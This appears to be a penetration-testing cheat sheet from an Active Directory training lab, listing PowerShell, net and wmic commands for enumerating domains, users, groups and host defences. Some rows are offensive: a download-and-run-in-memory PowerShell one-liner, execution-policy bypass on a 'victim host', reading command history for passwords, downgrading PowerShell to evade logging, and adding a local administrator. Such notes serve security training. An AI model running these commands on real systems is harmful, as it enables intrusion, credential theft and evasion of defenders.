# ActiveDirectory PowerShell Module

## Discover Modules
```powershell
Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
```

## Load ActiveDirectory Module
```powershell
PS:> Import-Module ActiveDirectory
PS:> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS... 
```

## Get domain info
```powershell
Get-ADDomain
```

## Get users info
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADUser -Identity adunn -Server domain -Properties *
```

## Checking For Trust Relationships
```powershell
Get-ADTrust -Filter *
```

## Group Enumeration
```powershell
Get-ADGroup -Filter * | select name
```

### Detailed Group Info
```powershell
Get-ADGroup -Identity "Backup Operators"

DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Backup Operators
ObjectClass       : group
ObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38
SamAccountName    : Backup Operators
SID               : S-1-5-32-551
```

### Group Membership
```powershell
Get-ADGroupMember -Identity "Backup Operators"

distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
name              : BACKUPAGENT
objectClass       : user
objectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName    : backupagent
SID               : S-1-5-21-3842939050-3880317879-2865463114-5220
```

# PowerView

# dsquery


# Native Tools

## Basic Enumeration Commands
| Command 	| Result  |
|:---------:|:-------:|
| hostname |	Prints the PC's Name |
| [System.Environment]::OSVersion.Version |	Prints out the OS version and revision level |
| wmic qfe get Caption,Description,HotFixID,InstalledOn 	| Prints the patches and hotfixes applied to the host |
| ipconfig /all |	Prints out | network adapter state and configurations |
| set | Displays a list of environment variables for the current session (ran from CMD-prompt) |
| echo %USERDOMAIN% | Displays the domain name to which the host belongs (ran from CMD-prompt) |
| echo %logonserver% | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |

## Systeminfo
```powershell
systeminfo
```

## Powershell
| Cmd-Let  | Description  |
|:--------:|:------------:|
| Get-Module | Lists available modules loaded for use. |
| Get-ExecutionPolicy -List | Will print the execution policy settings for each scope on a host. |
| Set-ExecutionPolicy Bypass -Scope Process | This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. | 
| Get-ChildItem Env: \| ft Key,Value | Return environment values such as key paths, users, computer information, etc. |
| powershell -nop -c "iex(New-Object | net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |

### Downgrade powershell
Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.

```powershell
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> get-module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...
```

## Checking Defenses

### Firewalls
```powershell
$ netsh advfirewall show allprofiles
```

### Windows Defender
```powershell
$ sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
```powershell
$ Get-MpComputerStatus

AMEngineVersion                  : 1.1.19000.8
AMProductVersion                 : 4.18.2202.4
AMRunningMode                    : Normal
AMServiceEnabled                 : True
AMServiceVersion                 : 4.18.2202.4
AntispywareEnabled               : True
AntispywareSignatureAge          : 0
AntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM
AntispywareSignatureVersion      : 1.361.414.0
AntivirusEnabled                 : True
AntivirusSignatureAge            : 0
AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
AntivirusSignatureVersion        : 1.361.414.0
BehaviorMonitorEnabled           : True
ComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482
ComputerState                    : 0
DefenderSignaturesOutOfDate      : False
DeviceControlDefaultEnforcement  : Unknown
DeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM
DeviceControlState               : Disabled
FullScanAge                      : 4294967295
FullScanEndTime                  :
FullScanOverdue                  : False
FullScanRequired                 : False
FullScanSignatureVersion         :
FullScanStartTime                :
IoavProtectionEnabled            : True
IsTamperProtected                : True
IsVirtualMachine                 : False
LastFullScanSource               : 0
LastQuickScanSource              : 2
```

## Am I Alone?

When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.

```powershell
qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen
 ```

## | network Information
| | networking Commands | Description |
|---------------------|-------------|
| arp -a |	Lists all known hosts stored in the arp table. |
| ipconfig /all |	Prints out adapter settings for the host. We can figure out the | network segment from here. |
| route print | Displays the routing table (IPv4 & IPv6) identifying known | networks and layer three routes shared with the host. |
| | netsh advfirewall show state | 	Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |

## Windows Management Instrumentation (WMI)
CheatSheet: https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4

Quick WMI checks
| Command |	Description |
| --------| ----------- |
| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patch level and description of the Hotfixes applied |
| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List 	| Displays basic host information to include any attributes within the list |
|wmic process list /format:list | A listing of all processes on host |
|wmic ntdomain list /format:list | Displays information about the Domain and Domain Controllers |
|wmic useraccount list /format:list | Displays information about all local accounts and any domain accounts that have logged into the device |
|wmic group list /format:list | Information about all local groups |
| wmic sysaccount list /format:list | Dumps information about any system accounts that are being used as service accounts. |

## net commands
| Command 	| Description|
| --------- | ---------- |
| net accounts 	Information about password requirements |
| net accounts /domain 	| Password and lockout policy|
| net group /domain |	Information about domain groups|
| net group "Domain Admins" /domain |	List users with domain admin privileges|
| net group "domain computers" /domain | 	List of PCs connected to the domain|
| net group "Domain Controllers" /domain |	List PC accounts of domains controllers|
| net group <domain_group_name> /domain |	User that belongs to the group|
| net groups /domain 	| List of domain groups|
| net localgroup | 	All available groups|
| net localgroup administrators /domain |	List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)|
| net localgroup Administrators |	Information about a group (admins)|
| net localgroup administrators [username] /add 	|Add user to administrators|
| net share 	|Check current shares|
| net user <ACCOUNT_NAME> /domain |	Get information about a user within the domain|
| net user /domain| 	List all users of the domain|
| net user %username% 	|Information about the current user|
| net use x: \computer\share |	Mount the share locally|
| net view| 	Get a list of computers|
| net view /all /domain[:domainname] |	Shares on the domains|
| net view \computer /ALL |	List shares of a computer|
| net view /domain |	List of PCs of the domain|